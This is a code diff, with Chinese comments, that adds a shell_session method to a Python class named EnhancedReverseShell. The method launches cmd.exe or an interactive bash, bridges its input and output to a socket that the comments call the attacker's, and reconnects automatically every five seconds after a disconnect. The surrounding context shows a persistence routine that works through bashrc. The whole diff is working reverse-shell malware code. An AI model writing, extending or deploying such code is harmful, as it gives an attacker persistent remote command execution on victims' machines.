@@ -9,6 +9,7 @@ import random
 import struct
 import ssl
 import shlex
+import select
 import urllib.parse
 import urllib.request
 import urllib.error
@@ -514,6 +515,101 @@ class EnhancedReverseShell:
     # 持久化功能
     # ====================================
     
+    def shell_session(self) -> None:
+        """在已连接的 socket 上启动交互式 shell，并把 I/O 桥接起来。
+        断线后自动重连，Ctrl+C 退出。"""
+        while True:
+            if not self.connected:
+                ok = self.connect()
+                if not ok:
+                    print("[会话] 重连失败，5秒后重试...")
+                    time.sleep(5)
+                    continue
+
+            # 根据平台选择 shell
+            if sys.platform == "win32":
+                shell_cmd = ["cmd.exe"]
+            else:
+                shell_cmd = ["/bin/bash", "-i"]
+
+            try:
+                proc = subprocess.Popen(
+                    shell_cmd,
+                    stdin=subprocess.PIPE,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    bufsize=0,
+                )
+                self.socket.settimeout(None)  # 会话期间改为阻塞模式
+                print("[会话] Shell 已启动，进入交互模式")
+
+                while True:
+                    # 监听 socket（攻击者输入）和 proc.stdout（命令输出）
+                    rlist = [self.socket, proc.stdout]
+                    try:
+                        readable, _, _ = select.select(rlist, [], [], 1.0)
+                    except (ValueError, OSError):
+                        break
+
+                    for r in readable:
+                        if r is self.socket:
+                            # 攻击者发来命令 -> 写入 shell stdin
+                            try:
+                                data = self.socket.recv(4096)
+                            except OSError:
+                                data = b""
+                            if not data:
+                                print("[会话] 连接断开")
+                                proc.terminate()
+                                self.connected = False
+                                break
+                            proc.stdin.write(data)
+                            proc.stdin.flush()
+                        elif r is proc.stdout:
+                            # shell 输出 -> 发回攻击者
+                            try:
+                                out = proc.stdout.read(4096)
+                            except OSError:
+                                out = b""
+                            if not out:
+                                self.connected = False
+                                break
+                            try:
+                                self.socket.sendall(out)
+                            except OSError:
+                                self.connected = False
+                                break
+                    else:
+                        # 检查 shell 进程是否退出
+                        if proc.poll() is not None:
+                            print("[会话] Shell 进程退出")
+                            self.connected = False
+                        continue
+                    break  # 内层 break 跳出 for，走到这里继续外层 while
+
+                proc.terminate()
+                if self.socket:
+                    try:
+                        self.socket.close()
+                    except OSError:
+                        pass
+                self.socket = None
+                self.connected = False
+
+                if not self.connected:
+                    print("[会话] 5秒后重连...")
+                    time.sleep(5)
+
+            except KeyboardInterrupt:
+                print("\n[会话] 用户中断，退出")
+                if proc.poll() is None:
+                    proc.terminate()
+                break
+            except Exception as e:
+                print(f"[会话] 错误: {e}，5秒后重连...")
+                self.connected = False
+                time.sleep(5)
+
     def setup_persistence(self, method: str = "bashrc") -> bool:
         """设置持久化连接（URL 与当前实例 host/port/https 一致）。"""
         try:
